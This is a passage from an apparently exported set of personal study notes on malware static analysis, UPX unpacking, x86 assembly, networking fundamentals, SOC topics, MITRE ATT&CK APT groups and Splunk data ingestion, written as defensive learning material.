the system are targeted and used may provide important information about the behavior of the malware.\nFile Paths\nStrings within the malware code may include path information regarding the files utilized by the malware. Knowing the directory in which the malware operates can streamline the analysis process and reduce the time required. Furthermore, file paths play a crucial role in identifying the specific files that the malware interacts with for read/write operations.\nIP Addresses\nStrings may contain the IP address(es) in a readable format. These IP addresses may correspond to the Command &amp; Control (C2) server that the malware communicates with to receive commands.  Therefore it is essential to check whether any IP address information is present in the strings to identify and monitor the network activities associated with the malware.\nDomain Names\nStrings may contain domain names. Examining these domain names is necessary to understand the behavior of the malware. Malware may attempt to exfiltrate data from the network using the DNS protocol. In this sense, it is crucial to scrutinize network communications involving suspicious domain addresses.\nURL Addresses\nStrings can contain URL addresses. Malware can use URL addresses for various purposes. For example, it can download files or retrieve the information it needs from the internet, or similarly, it can use a URL address to exfiltrate data from the network.\nSecurity Products\nStrings may contain the names of security solutions, namely; IDS, antivirus, and EDR. In order to hide its behavior on the compromised system, the malware may check whether there is a security solution on the operating system. It may or may not perform its operations accordingly. If a security solution circumvention method is available, it may apply and continue its operations on the system.\nCrypto References\nStrings may include the names of cryptology libraries. The presence of such library names in strings suggests that the malware can perform encryption operations. For example, ransomware-type malware can encrypt files. When cryptographic libraries are identified within the strings, it is crucial to consider the possibility that the malware may be ransomware or involved in encryption operations.\nWindows API Info\nStrings may contain the names of library files belonging to Windows. Malware can use libraries of Windows to perform operations on the system. For example, the attacker may attempt to remotely connect to the system through the session initiated by the malware and manage the system from the graphical interface. Windows libraries may be employed to determine the presence or absence of user activity on the screen or to monitor similar system activities.\nBase64 Encoded Data\nStrings may contain base64 encoded data within them. Malware may contain encoded data to hide some information between strings or to avoid detection by automated static analysis tools. Therefore, encoded data must be detected and decoded when analyzing malware strings.\nAnalyzing Embedded Strings\nAnalyzing the strings of malware is generally a straightforward process. However, identifying the specific values within the strings that provide crucial information about the malware can be challenging. The string output can be lengthy, making it easy to overlook important strings. It is recommended to perform a target-oriented analysis by applying certain search methods. Command line tools or tools with graphical user interface (GUI) can be used when analyzing strings.\nAnalyzing Embedded Strings with Command Line\nIn the Windows operating system, the “strings” tool among the Sysinternals tools can be used to examine the strings of malware via the command line. You can access the strings tool from the address below:\nStrings: learn.microsoft.com/en-us/sysinternals/downloads/strings \nLet’s examine the strings of a malware from the command line:\nCommand: strings64.exe -accepteula malwr3.exe | more\n\nAs seen in the image above, the command line is opened in the directory where the strings tool is located and the strings of the malware named “malwr3.exe” is successfully displayed.\nNote: When using the strings tool for the first time, the user agreement must be confirmed with the “-accepteula” parameter, otherwise the tool will not work.\nLet’s move on to analyzing the strings:\n\nAs seen in the image above, an IP address is identified in the strings output. This IP address could be the Command &amp; Control (C2) server IP address from which the malware receives commands or an IP address to which it establishes connections. \nAnalyzing Embedded Strings with GUI\nExamining strings can be achieved with the “Bintext” tool, which has a graphical user interface (GUI) instead of the command line. You can access the Bintext tool at the following address:\nBintext: www.portablefreeware.com/index.php#:~:text=BinText%20is%20a%20file%20text,as%20well%20as%20Resource%20strings. \nLet’s see the strings of the malware in the previous example with bintext as an instance:\n\nUpon launching the Bintext tool, the interface displayed is similar to the image above. We can proceed by providing the malware to the Bintext tool and examine its strings. \n\nAs in the image above, first, the malware is loaded into the program using the “Browse” button and then the strings are displayed with the “Go” button.  Let’s proceed with further examination of the string:\n\nAs seen in the image above, the IP address information has been successfully displayed with the bintext tool. As seen in the image above, the IP address information has been successfully displayed with the bintext tool. Additionally, the Bintext tool offers a search feature. The desired value can be searched from the section at the bottom right of the window."},"Malware-Analysis/Unpacking-Malware":{"slug":"Malware-Analysis/Unpacking-Malware","filePath":"Malware Analysis/Unpacking Malware.md","title":"Unpacking Malware","links":[],"tags":[],"content":"First, we will find out the packer information with the “CFF Explorer” tool:\n\nAs can be seen in the image above, “UPX” packer name is written in the “File Info” section. The sections of the executable file are also as follows:\n\nThe image above displays the section names of the UPX packer. Through analysis of the “File Info” and “Section” sections, it has been concluded that the malware in question was packed with the UPX packer.\nOnce the packer used has been identified, the next step is to unpack the executable file using the appropriate tool. In the case of UPX packer, since it is an open-source packer, the required tool for unpacking is readily available on the internet. You can access the tool at the following address:\nUPX: upx.github.io/ \nNote: If a different packer was used and no readily available unpacking tool existed, the unpacking process would involve writing custom unpacking code or utilizing dynamic reverse engineering tools to analyze the executable file and extract the unpacked version.\nThe “CFF Explorer” tool includes a UPX unpacker itself, which allows for quick and efficient unpacking directly from the “UPX Utility” section.\n\nAfter the executable file has been unpacked using the “Unpack” button seen in the image above, the “File Info” field in the “File” menu on the left is checked.\n\nAs depicted in the image, the field that previously displayed “UPX” no longer indicates the presence of UPX after the unpacking process. This change signifies that the executable file has been successfully unpacked. The sections of the unpacked executable file are analyzed and examined: \n\nAs evident from the image, the sections of the unpacked Windows executable file appear in the expected arrangement, resembling a typical unpacked executable. This indicates that the unpacking operation has been carried out successfully.\nThe executable file unpacked via CFF Explorer is not saved as a separate file within the system. If the program is closed, the unpacking process needs to be repeated on the file. However, it is possible to export and save the unpacked executable file using CFF Explorer. To save the unpacked file, the steps “File → Save As” should be followed from the top menu.\n\nIf the steps in the image above are applied, the unpacked version of the executable file will be saved."},"Malware-Analysis/x86-Assembly":{"slug":"Malware-Analysis/x86-Assembly","filePath":"Malware Analysis/x86 Assembly.md","title":"x86 Assembly","links":[],"tags":[],"content":"What is X86 Assembly Language?\nAssembly language can be described as a machine language which is different for each processor. Assembly language is more difficult to understand than other programming languages. Running programs can be analyzed at the processor level only through the assembly language. This training describes the x86 assembly language.\nAT&amp;T and Intel Syntax\nMany syntaxes can be used when expressing commands in the assembly language program flow. “AT&amp;T” and “Intel” syntaxes are two of them. Brief examples of both syntaxes are given below. The syntax to be used in the examples in the training as well as the reverse engineering processes is the “Intel” syntax.\nThe following examples show different syntax versions of the same “main” function. The tool used for disassemble operation is the “objdump” tool.\nAT&amp;T Syntax\nCommand: `sudo objdump -d helloworld\n\nYou can see the “AT&amp;T” syntax roughly in the image above. In the AT&amp;T syntax, which has a different notation than the Intel syntax, the ”%” sign is prefixed to the register names. Another difference is that the direction of operation in MOV instruction is from left to right.\nIntel Syntax\nCommand: `sudo objdump -d -M intel helloworld\n\nThe above image shows the “Intel” syntax\nAddressing Modes\nThe assembly language has many different addressing modes. Some of these are as follows: \nRegister Addressing\nIn this addressing, registers are used as operands. For example:\n`MOV EAX, EBX\nAbove, the operation is applied between two registers. \nImmediate Addressing\nA fixed value is used as the operand in this addressing. For example:\n`MOV EAX, 0x0\nThe operation is applied between the fixed value and the register in the above operation.\nMemory Addressing\nThe memory address is used as the operand in this addressing. For example:\n`MOV EAX, DWORD PTR [ESP]\nThe operation is applied between the memory address and the register in the above operation."},"Networking/ARP":{"slug":"Networking/ARP","filePath":"Networking/ARP.md","title":"ARP","links":["Networking/Mac-Address","Networking/IP-Address","Networking/Port"],"tags":[],"content":"Address Resolution Protocol (ARP) is used to get Mac Address of a host from using its IP Address.\nHow ARP Works\nWhen a host needs to find Mac Address of destination device in same network, following steps are followed by the host.\n1. ARP REQUEST\nAn Ethernet Broadcast is sent by the host with the IP Address of destination device.\nNote:\n\nRouters do not forward broadcasts.\nEthernet broadcast are frames with their destination address FF:FF:FF:FF:FF:FF or FFFF.FFFF.FFFF.\nSwitches flood broadcasts to all ports except the incoming Port.\n\n2. ARP REPLY\nThe host with the matching IP Address sends its Mac Address back to the original sending host.\n3. ARP Table\nWhen the sending host receives the message, it stores the Mac Address and IP Address information in a table called an ARP table."},"Networking/Bandwidth-vs-Throughput":{"slug":"Networking/Bandwidth-vs-Throughput","filePath":"Networking/Bandwidth vs Throughput.md","title":"Bandwidth vs Throughput","links":[],"tags":[],"content":"Bandwidth\nIt is the total capacity of a network to transfer data over an interval of time. It is measured in kbps, mbps, gbps.\nThroughput\nIt is also the capacity of network to transfer data but also considers latency and other factors.\nIt means bandwidth is how much it can transfer and throughput is how much it is able to transfer with a time interval due to factors such as latency and data loss."},"Networking/DHCP":{"slug":"Networking/DHCP","filePath":"Networking/DHCP.md","title":"DHCP","links":["IP-address","Networking/IP-Address","Networking/IPV4-Address","Networking/Gateway","Networking/Mac-Address"],"tags":[],"content":"Dynamic Host Configuration Protocol (DHCP) is a protocol to dynamically assign IP address to a host is generally the preferred method of assigning IPv4 addresses to hosts on large networks because it reduces the burden on network support staff and virtually eliminates entry errors.\nHow DHCP works?\n1. DHCP Discover\nNew clients send DHCP broadcast when they join the network.\n2. DHCP Offer\nThe broadcast is then received by the DHCP Server and an DHCP offer is sent back to client which contains\n\nIP Address\nSubnet Mask\nDefault Gateway address\n\n3. DHCP Request\nThe client then again sends a DHCP request packet that it will accept the address.\n4. DHCP Acknowledgement\nThe server finally sends back a DHCP packet stating that the IP address assignment has been  associated with the Mac Address of the host in its table.\nDHCP Server\nDHCP Servers can be any system running DHCP service.\nWith most medium to large networks, the DHCP server is usually a local dedicated PC-based server.\nBut for home networks, the router acts as both DHCP client and a server. The router receives the public IP Address from the ISP as DHCP client, and in its role as a DHCP server, it distributes private addresses to internal hosts."},"Networking/DNS":{"slug":"Networking/DNS","filePath":"Networking/DNS.md","title":"DNS","links":[],"tags":[],"content":"abbr. Domain Name System\nManual Lookup\n&gt; nslookup google.com\nServer:  dns.google\nAddress:  8.8.8.8\n \nNon-authoritative answer:\nName:    google.com\nAddresses:  2404:6800:4002:826::200e\n          142.250.195.14"},"Networking/Ethernet-Protocol":{"slug":"Networking/Ethernet-Protocol","filePath":"Networking/Ethernet Protocol.md","title":"Ethernet Protocol","links":["Networking/OSI-Model","Networking/Mac-Address","Networking/Port"],"tags":[],"content":"Ethernet Frame\nEthernet frame are a part of Data Link Layer of OSI Model. Data to be transported between one NIC to other NIC in the same network is transported through the Ethernet Protocol.\nAn Ethernet Frame looks like:\n\nwhere,\n\nPreamble: It syncs the receiver NIC with the sender NIC bit by bit.\nSFD (abbr. Start Frame Delimiter): Indicates the start of actual of information related to ethernet frame.\nCRC (Frame Check Sequence): It makes sure that there was no error in received frame.\n\nEthernet Switch/ Layer 2 Switch\nEthernet switch is a device which connects multiple NICs together and is responsible to route ethernet frames from source NIC to destination NIC based on Layer 2 address. It checks for the receiving Mac Address in its Mac Address Table and forwards the frame to the Port linked with the Mac Address.\nWhen an ethernet switch receives an ethernet frame:\n\nIts checks if the source address is in the Mac Address table and if its not there adds it.\nThen checks if the destination address is there and\n\nIf founds forwards the frame to the respective Port.\nIf not found forwards the frame to all ports except the source Port.\nWhen the destination source sends frame back as source, the switch adds the address it its table then.\n\n\n"},"Networking/Gateway":{"slug":"Networking/Gateway","filePath":"Networking/Gateway.md","title":"Gateway","links":["Networking/DHCP","Networking/Gateway","IP-address"],"tags":[],"content":"Gateways are the “Door” in and out of a network. In home networks, the router acts as both the DHCP Server and Gateway. Default gateway address is set when configuring the IP settings either statically or dynamically using DHCP\nFor example,\nLets say we are in a network and our IP address is 192.168.5.12 and our gateway is 192.168.5.1 (the router). Similarly, in the same physical network but on different logical network is other device 192.168.6.12, then its gateway might be 192.168.6.10, even though both of them are addressing the same router; they need different Gateway addresses because they are in different logical networks."},"Networking/IP-Address":{"slug":"Networking/IP-Address","filePath":"Networking/IP Address.md","title":"IP Address","links":["Networking/IPV4-Address","Networking/IPV6-Address"],"tags":[],"content":"IP Address is logical address of a computer in a computer network. IP address are used to facilitate Network Layer/Layer3 communication.\nCurrently there exist two types of IP Addresses\n\nIPV4 Address: 192.168.1.1\nIPV6 Address: fe80::7c6:ec37:1b55:6600\n\nFollowing commands can be used to view IP address of host\n\nipconfig\n"},"Networking/IPV4-Address":{"slug":"Networking/IPV4-Address","filePath":"Networking/IPV4 Address.md","title":"IPV4 Address","links":["Networking/IPV4-Address","HTB/Services","Networking/NAT","Networking/Gateway","Networking/DHCP"],"tags":[],"content":"An IPV4 Address is used to identify each device in a network. It is a logical address of a device on a network.\n\nSubnet Mask\nThe subnet mask is used to identify the network on which the host is connected.\ne.g.,\na host with a subnet mask of 255.255.255.0 has its network address as first three octets.\nThe subnet mask for 255.255.255.0 can also be represented using slash notion or /24. This indicates that the subnet mask is 24 bits long.\n\nAddress Structure\nAn ipv4 address is 32 bits in length, and the 32 bits are grouped into four 8-bit bytes called octets like this:\n11010001.10100101.11001000.00000001\nFor ease in reading they are then converted into decimal format which we see,\n201.165.200.1\nAn ipv4 address can be divided into two portions:\n1. Network Portion\nIt is used to identify the network address of a host.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has a network address as 192.168.5.0.\nTwo different hosts on different networks can’t communicate with each other, e.g., 192.168.1.5 and 192.168.2.5 can’t communicate directly and need a router to facilitate the connection.\n2. Host Portion\nIt is used to identify a host in a network.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has the host address as 11.\n\nData Transmission\n1. Unicast\nUnicast transmission refers to one device sending a message to one other device in one-to-one communications.\nNote: A source IP address can only be a unicast address, because the packet can only originate from a single source. This is regardless of whether the destination IP address is a unicast, broadcast, or multicast.\n2. Broadcast\nBroadcast transmission refers to a device sending a message to all the devices on a network in one-to-all communications. By default, routers do not forward broadcasts to other networks.\nA broadcast packet has a destination IP address with all 32 one (1) bits.\nNote:\n\nIPv4 uses broadcast packets. However, there are no broadcast packets with IPv6.\nA router will not forward a broadcast, but a switch.\n\n3. Multicast\nMulticast transmission reduces traffic by allowing a host to send a single packet to a selected set of hosts that subscribe to a multicast group.\nA multicast packet is a packet with a destination IP address that is a multicast address. IPv4 has reserved the 224.0.0.0 to 239.255.255.255 addresses as a multicast range.\nThe multicast clients use Services requested by a client program to subscribe to the multicast group. Each multicast group is represented by a single IPv4 multicast destination address. When an IPv4 host subscribes to a multicast group, the host processes packets addressed to this multicast address, and packets addressed to its uniquely allocated unicast address.\n\nPrivate and Public IP Addresses\nPrivate IP Address\nPrivate IP address are used for communication within a network and can’t be used to communicate with internet.\nPrivate IP Address have the following network addresses:\n\n10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\n\nPublic IP Address\nPublic IP address is used to communicate on the internet and is unique worldwide.\nNote: When we connect to internet, we must convert our private address to public, and this is done by home router using Network Address Translation (NAT).\n\nLoopback addresses\nLoopback addresses (127.0.0.0 /8 or 127.0.0.1 to 127.255.255.254) are more commonly identified as only 127.0.0.1. These are special addresses used by a host to direct traffic to itself.\n\nLegacy Classful Addressing\nIn early days with a limited number of computers using the internet, classful addressing was an effective means to allocate addresses. Classful address allocation was later replaced with classless addressing, which is used today. Classless addressing ignores the rules of classes (A, B, C).\nClass A\n\n(0.0.0.0/8 to 127.0.0.0/8)\nSupports extremely large networks with more than 16 million host addresses per network. Class A used a fixed /8 prefix with the first octet to indicate the network address and the remaining three octets for host addresses.\n\nClass B\n\n(128.0.0.0 /16to 191.255.0.0 /16)\nSupports moderate to large size networks with up to approximately 65,000 hosts per network. Class B used a fixed /16 prefix with the two high-order octets to indicate the network address and the remaining two octets for host addresses.\n\nClass C\n\n(192.0.0.0 /24 to 223.255.255.0 /24)\nSupport small networks with a maximum of 254 hosts per network. Class C used a fixed /24 prefix with the first three octets to indicate the network and the remaining octet for the host addresses.\n\n\nIP Assignment Techniques\n1. Static Assignment\nWith a static assignment, the network administrator must manually configure the network information for a host. At a minimum, this includes the following:\n\nIP address: This identifies the host on the network.\nSubnet Mask: This is used to identify the network on which the host is connected.\nDefault Gateway: This identifies the networking device that the host uses to access the internet or another remote network.\n\n2. Dynamic Assignment\nRather than have the network administrator assign IPv4 addresses for each workstation, it is easier to have IPv4 addresses assigned automatically. This is done using a protocol known as Dynamic Host Configuration Protocol (DHCP).\nThe benefit of DHCP is that an address is not permanently assigned to a host but is only leased for a period of time. If the host is powered down or taken off the network, the address is returned to the pool for reuse."},"Networking/IPV6-Address":{"slug":"Networking/IPV6-Address","filePath":"Networking/IPV6 Address.md","title":"IPV6 Address","links":["Networking/IPV6-Address","Networking/IPV4-Address","Networking/NAT"],"tags":[],"content":"IPV6 Address was introduce to overcome the limitations of IPV4 Address.\nIPv6 addresses are 128 bits in length and written as a string of hexadecimal values. Every four bits are represented by a single hexadecimal digit; for a total of 32 hexadecimal values, divided into 8 parts with colon (:) every 4 digits.\ne.g., 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nFormatting Rules\n1. Omit leading Zero\nPreferred Format: 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nNo leading 0s: 2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234\n2. Double Colon\nContiguous segments of zeros can be represented by double colon (… : abcd : : efgh : …)\ne.g.,\n2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234 can be written as,\n2001 : db8 : 0 : a3 : abcd :: 1234\nNote: Double colon can only be used only once and its best practice it use it on the longest segments of zero.\nIPV6 Address &amp; IPV4 Address Coexistance\n1. Dual Stack\nBoth ipv4 and ipv6 coexist in this technology and is adopted mostly.\n2. Tunneling\nTunneling is a method of transporting an IPv6 packet over an IPv4 network. The IPv6 packet is encapsulated inside an IPv4 packet, similar to other types of data.\n3. Translation\nNetwork Address Translation 64 (NAT64) allows IPv6-enabled devices to communicate with IPv4-enabled devices using a translation technique similar to NAT for IPv4. An IPv6 packet is translated to an IPv4 packet and an IPv4 packet is translated to an IPv6 packet."},"Networking/Mac-Address":{"slug":"Networking/Mac-Address","filePath":"Networking/Mac Address.md","title":"Mac Address","links":["Networking/Ethernet-Protocol","Networking/IPV4-Address","Networking/ARP","ICMPv6-Neighbor-Discovery"],"tags":[],"content":"A MAC (Media Access Control) address is a unique identifier assigned to a network interface card (NIC) for use in communications within a network segment.\nMac address works at a lower level: Layer 2: Data Link (i.e. Ethernet Mac Address), than the IP Address which works at Layer 3: Network, hence it offers direct communication between NIC to NIC.\nWhen a Layer 3 IP packet is sent from a host, it is encapsulated within Layer 2 Ethernet Frame by NIC which is de-encapsulated by destination NIC. When a packet is sent outside the network:\n\nThe host sends Ethernet Frame with router’s mac address as destination\nThe router de-encapsulates the packet and finds optimal path to destination.\nThe IP packet is re-encapsulated with the next destination mac address\nThis process is continued for each network hop.\n\nHow are IP address associated with Mac address\nFor IPv4 packets, this is done through a process called Address Resolution Protocol (ARP). For IPv6 packets, the process is ICMPv6 Neighbor Discovery (ND)."},"Networking/NAT":{"slug":"Networking/NAT","filePath":"Networking/NAT.md","title":"NAT","links":["Networking/IP-Address","Networking/NAT","Networking/IPV4-Address","Networking/DHCP"],"tags":[],"content":"NAT abbr. Network Address Translation is the process of translating a private IP Address into public IP Address and vice versa. It is done by the router when a user tries to send a packet to a host not in the network.\nThe router keeps a table of Private IP Addresses and their Public IP Addresses, and when a packet destined to Internet is sent by a host, the router uses NAT to convert it to public address by modifying the packet and forwards to the internet.\nSimilarly, when a packet reaches the router with public IP Address the router replaces the public address with private address using its table.\nIf an associated public IP Address is present in the table, the router uses DHCP to get a public IPV4 Address for the host and then adds it to table and replaces IP and finally forwards it to the Internet."},"Networking/OSI-Model":{"slug":"Networking/OSI-Model","filePath":"Networking/OSI Model.md","title":"OSI Model","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"Abbr: Open Systems Interconnection\n\nIt has 7 layers:\n\nPhysical Layer\nDescribes the mechanical/electrical and other means to activate, maintain and deactivate physical connection to the network.\nData Link Layer\nProvides methods for exchanging data between devices in a common media\nNetwork Layer\nServices to actually exchange data between the devices.\nIP addressing occurs at this layer.\nTransport Layer\nServices to segment, transfer, and reassemble data for individual communication between devices.\nSession Layer\nProvides services for presentation layer to manage data exchange.\nPresentation Layer\nProvides representation for data transferred between Application layer.\nApplication Layer\nControls protocol for communication between the application.\n\nOSI Model and TCP IP Model both are models to transfer data in a network but have some differences. These differences are presented in TCP IP vs OSI Model."},"Networking/Port":{"slug":"Networking/Port","filePath":"Networking/Port.md","title":"Port","links":["Networking/TCP","HTB/FTP","HTB/ssh","Networking/UDP","Networking/DHCP"],"tags":[],"content":"A port is a numeric identifier within each segment that is used to keep track of specific conversations between a client and server. Ports are assigned and managed by an organization known as the Internet Corporation for Assigned Names and Numbers (ICANN). Ports are broken into three categories and range in number from 1 to 65,535:\nTypes of Ports\n1. Well-known ports\nDestination ports that are associated with common network applications are identified as well-known ports. These ports are in the range of 1 to 1023.\n2. Registered ports\nPorts 1024 through 49151 can be used as either source or destination ports. These can be used by organizations to register specific applications such as IM applications.\n3. Reserved ports\nPorts 49152 through 65535 are often used as source ports. These ports can be used by any application.\nVisual Representation\n\nSome Common Ports\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPort NumberTransportApplication Protocol20TCPFile Transfer Protocol (FTP) - Data21TCPFTP - Control22TCPSecure Shell (ssh)23TCPTelnet25TCPSimple Mail Transfer Protocol (SMTP)53UDP, TCPDomain Name Service (DNS)67UDPDynamic Host Configuration Protocol (DHCP) - Server68UDPDHCP - Client69UDPTrivial File Transfer Protocol (TFTP)80TCPHypertext Transfer Protocol (HTTP)110TCPPost Office Protocol version 3 (POP3)143TCPInternet Message Access Protocol (IMAP)161UDPSimple Network Management Protocol (SNMP)443TCPHypertext Transfer Protocol Secure (HTTPS)"},"Networking/Socket":{"slug":"Networking/Socket","filePath":"Networking/Socket.md","title":"Socket","links":["Networking/Port"],"tags":[],"content":"The combination of the source IP address and source Port number, or the destination IP address and destination Port number is known as a socket.\nSockets enable multiple processes, running on a client, to distinguish themselves from each other, and multiple connections to a server process to be distinguished from each other."},"Networking/TCP-IP-Model":{"slug":"Networking/TCP-IP-Model","filePath":"Networking/TCP IP Model.md","title":"TCP IP Model","links":["Networking/TCP","Networking/TCP-IP-Model","Networking/OSI-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"TCP/IP protocol is responsible for guaranteeing reliable delivery of a packet.\n\nTCP/IP protocol has 4 layers:\n\nApplication Layer\nRepresents data to the user, encoding and dialog control\nTransport Layer\nSupports communication between various devices across network\nInternet Layer\nDetermines best path through the network\nNetwork Access Layer\nControls the devices and media that make up the network\n\nThe difference between TCP IP Model and OSI Model are given in TCP IP vs OSI Model."},"Networking/TCP-IP-vs-OSI-Model":{"slug":"Networking/TCP-IP-vs-OSI-Model","filePath":"Networking/TCP IP vs OSI Model.md","title":"TCP IP vs OSI Model","links":[],"tags":[],"content":"While TCP/IP and OSI both are meant to standardize communication in a network, they have some key similarities and differences.\n\nTCP/IP model does not describe general functions that are necessary for all networking communications. It describes the networking functions specific to those protocols in use in the TCP/IP protocol suite\nThe protocols that make up the TCP/IP protocol suite can be described in terms of the OSI reference model. The key similarities are in the transport and network layers; however, the two models differ in how they relate to the layers above and below each layer."},"Networking/TCP":{"slug":"Networking/TCP","filePath":"Networking/TCP.md","title":"TCP","links":["Networking/Transport-Layer-Protocol","Networking/UDP"],"tags":[],"content":"Transmission Control Protocol (TCP) is a Transport Layer Protocol that is widely used to ensure reliable and ordered delivery of data over a network. Unlike UDP, TCP is a connection-oriented protocol that establishes a connection between the sender and receiver before data transmission.\nKey Features\n\nReliable Data Transfer: TCP ensures that all packets are delivered and in the correct order by using acknowledgments and retransmissions.\nConnection-Oriented: A connection is established and maintained until the data transfer is complete, ensuring that data is transmitted between the correct endpoints.\nFlow Control: TCP uses flow control mechanisms to prevent network congestion by adjusting the rate of data transmission based on the receiver’s ability to process data.\nError Detection and Correction: TCP includes mechanisms for error checking and correction to ensure data integrity.\nThree-Way Handshake: Connections are established using a three-way handshake (SYN, SYN-ACK, ACK) to synchronize the sender and receiver.\n\nApplications like web browsing, email, and file transfers use TCP because they require reliable and ordered delivery of data."},"Networking/Transport-Layer-Protocol":{"slug":"Networking/Transport-Layer-Protocol","filePath":"Networking/Transport Layer Protocol.md","title":"Transport Layer Protocol","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/UDP","Networking/TCP"],"tags":[],"content":"Transport Layer is the 4th Layer of OSI Model and 3rd Layer of TCP IP Model. It is responsible for ensuring packets are sent reliably and any missing packets are resent.\nSome of the protocols in this layer are:\n1. UDP Protocol\n2. TCP Protocol"},"Networking/UDP":{"slug":"Networking/UDP","filePath":"Networking/UDP.md","title":"UDP","links":["Networking/Transport-Layer-Protocol","Networking/TCP"],"tags":[],"content":"User Datagram Protocol (UDP) is a Transport Layer Protocol which is used transferring data over networks.\nUDP packets each have their own header and payload. The header contains information essential for routing and delivery, including source and destination ports, length, and a checksum.\nUnlike TCP, UDP does not establish a connection before transferring data and does not guarantee reliable delivery, order, or data integrity. This makes UDP faster and more efficient for applications that can tolerate packet loss, such as live broadcasts and online gaming."},"Networking/URI,-URN-and-URL":{"slug":"Networking/URI,-URN-and-URL","filePath":"Networking/URI, URN and URL.md","title":"URI, URN and URL","links":["HTB/FTP","HTB/ssh","tags/page155"],"tags":["page155"],"content":"Web resources and web services such as RESTful APIs are identified using a Uniform Resource Identifier (URI). A URI is a string of characters that identifies a specific network resource. As shown in the figure, a URI has two specializations:\n\nUniform Resource Name (URN) - This identifies only the namespace of the resource (web page, document, image, etc.) without reference to the protocol.\nUniform Resource Locator (URL) - This defines the network location of a specific resource on the network. HTTP or HTTPS URLs are typically used with web browsers. Other protocols such as FTP, SFTP, ssh, and others can be used as a URL. A URL using SFTP might look like: sftp://sftp.example.com.\n\nParts of URI\nThese are the parts of a URI, as shown in the figure:\n\nProtocol/scheme - HTTPS or other protocols such as FTP, SFTP, mailto, and NNTP\nHostname - w​ww.example.com\nPath and file name - /author/book.html\nFragment - page155\n\n"},"SOC/!-SOC-Learning-Pathway":{"slug":"SOC/!-SOC-Learning-Pathway","filePath":"SOC/! SOC Learning Pathway.md","title":"! SOC Learning Pathway","links":["SOC/What-is-SOC","SOC/Pyramid-of-Pain","SOC/Cyber-Kill-Chain","SOC/Unified-Kill-Chain","SOC/MITRE-ATT-and-CK-Framework","SOC/Phishing","SOC/Web-Attacks","Malware-Analysis/Malware-Analysis","Malware-Analysis/Malicious-Doc-Analysis","SOC/Security-Solutions","SOC/Splunk","SOC/Cyber-Threat-Intelligence"],"tags":[],"content":"1. What is SOC?\n2. Pyramid of Pain\n3. Cyber Kill Chain\n4. Unified Kill Chain\n5. MITRE ATT&amp;CK Framework\n6. Phishing\n7. Web Attacks\n8. Malware Analysis\n9. Malicious Doc Analysis\n10. Security Solutions\n11. Splunk\n12. Cyber Threat Intelligence"},"SOC/APT-Groups":{"slug":"SOC/APT-Groups","filePath":"SOC/APT Groups.md","title":"APT Groups","links":[],"tags":[],"content":"Advanced Persistent Threat (APT) Groups, are the hacker groups that may include many different people and groups that carry out cyber attacks in a targeted and systematic way, with governments support from time to time.\nWithin the MITRE ATT&amp;CK Framework, information about APT groups is collected which helps identify which APT group is targeting which systems and which cyber attack techniques are being implemented. When all this information is gathered together and evaluated with the MITRE ATT&amp;CK matrix, the attack map of the APT group can be revealed.\nGroups: 135\nGroups: attack.mitre.org/groups/ \nExample: Lazarus Group\nThe information about the “Lazarus Group” APT group is as follows:\n\nAs seen in the image above, each APT group listed in the MITRE ATT&amp;CK Framework has a unique Group ID, Name and Description.\nYou can also see the information about the techniques used by the group in cyber attacks at the bottom of the page:\n\nUnder the “Techniques” column, you can see what tools, software or techniques that the APT group was leveraged for the attack. e.g., some software used by the “Lazarus Group” APT group is as in the image below:\n"},"SOC/Adding-Data-to-Splunk":{"slug":"SOC/Adding-Data-to-Splunk","filePath":"SOC/Adding Data to Splunk.md","title":"Adding Data to Splunk","links":[],"tags":[],"content":"In Splunk, you can add data in different ways. Here we are going to see the forwarder installed on the Win10 computer and with the upload of a log file.\nAdd Data from Forwarder\n\nGo to Settings &gt;Add Data\n\n\n\nSelect “Forward” at the bottom\n\n\n\n\nAdd the computer to the selected host and give it a Server Class Name\n\n\nClick “Next”\n\n\n\n\n\nSelect what you want to monitor, in this case, we want to collect the local event log from this computer.\n\n\nSelect which log you want\n\n\nClick “Next”\n\n\n\n\n\nSelect the index where the logs need to be put.\n\n\nI choose to create a new one named “WinLog_clients”. For this, click on “create a new Index”\n\n\nClick Review to check and then submit.\n\n\nNow, you can click “start searching” to try to find your last connection on the client’s computer.\nCheck Your Indexes\n\nGo to Settings &gt; Indexes\n\n\n\nSearch the index you create previously\n\n\n\nAs you see there is no incoming event, you are going to configure it now.\n\nAdd Receiver\n\n\nGo to Setting &gt; Forwarding and receiving\n\n\nClick to add new receiving\n\n\n\n\n\nAdd the 9997 port (it’s the default one, remember it in the previous document)\n\n\nWait a few minutes and check your indexes again, you will see new values\n\n\n\n\nTry a quick search\n\n\nAdd Data From Uploaded Logs\n\nGo to Settings &gt; Add Data\n\n\n\nSelect “Upload” in the bottom left corner\n\n\n\nPush the file you want to upload, then click “Next”\n\n\n\n\nCheck how Splunk will read your file, then press Next if everything is okay\n\n\nSelect a host field value if needed, and the index which is going to be used (left default in the exercise)\n\n\nContinue to the end, and start searching on it\n\n\n"},"SOC/Adversary's-Objectives":{"slug":"SOC/Adversary's-Objectives","filePath":"SOC/Adversary's Objectives.md","title":"Adversary's Objectives","links":["SOC/Unified-Kill-Chain","SOC/C2"],"tags":[],"content":"The ultimate goal of adversary usually boils down to one pr multiple of the three:\n\nsteal data\ndestroy the organization\nmake an impact\n\nThe Unified Kill Chain describes these motives in three steps:\nCollection\nMITRE Tactic (TA0009)\nAfter all the hunting for access and assets, the adversary will be seeking to gather all the valuable data of interest. This, in turn, compromises the confidentiality of the data and would lead to the next attack stage – Exfiltration. The main target sources include drives, browsers, audio, video and email.\nExfiltration\n(MITRE Tactic TA0010)\nTo elevate their compromise, the adversary would seek to steal data, which would be 